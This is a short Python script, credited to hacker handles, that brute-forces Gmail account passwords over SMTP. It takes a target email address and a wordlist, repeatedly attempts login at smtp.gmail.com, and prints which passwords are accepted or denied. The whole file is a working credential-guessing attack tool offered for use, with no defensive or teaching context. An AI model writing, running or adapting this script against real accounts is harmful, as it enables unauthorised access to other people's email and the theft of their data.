#!/usr/bin/env python
# ; Recoded By: Ob1t0
# ; Coded By: Ian GPX
# ; Version: 1.0
# ; Gr33tz: No Name
# ; Require: SmtpLib, and Python 3.X +
class SmtpForc3:
    import argparse, smtplib

    # ; Adicionando argumetnos | Adding Aruments;
    parser = argparse.ArgumentParser(description=" Recoded By: Ob1t0 | Credits: Ian GPX | Gr33tz: No Name :3")
    parser.add_argument("-u", help="Email Username... Example: smtpforc3.py -u blahto@gmail.com", metavar="<Email>", dest="user", required="True",  action="store")
    parser.add_argument("-w", help="Name of your wordlist... Example: smtpforc3.py -u blahto@gmail.com -w wordlist.txt", metavar="<Wordlist>", dest="wordl", required="True", action="store")
    arg = parser.parse_args()

    # ; Definindo Variáveis | Defining Variables
    _server = smtplib.SMTP("smtp.gmail.com", 587)
    _server.ehlo(), _server.starttls()

    # ; Testando arquivos | Testing archives
    usr = arg.user
    wl = arg.wordl
    wl_lines = open(wl, "r")
    # ; Mostrando valores definidos | Showing defined values
    print("+-------------=[-/- Informations -/-]=-------------+")
    print("|")
    print("| USERNAME: ", usr)
    print("|")
    print("+--------------------------------------------------+")
    # ; Programa | Program
    for wl_line in wl_lines:
        passwd = wl_line
        try:
            if _server.login(usr, passwd):
                print("| [+] Accepted Password    : ", passwd)
        except smtplib.SMTPAuthenticationError as e:
            _error = str(e)
            if _error[15] == "<":
                print("| [+] Accepted Password    : ", passwd)
            else:
                print("| [-] Denied Password      : ", passwd)
if __name__ == "__main__":
    SmtpForc3()
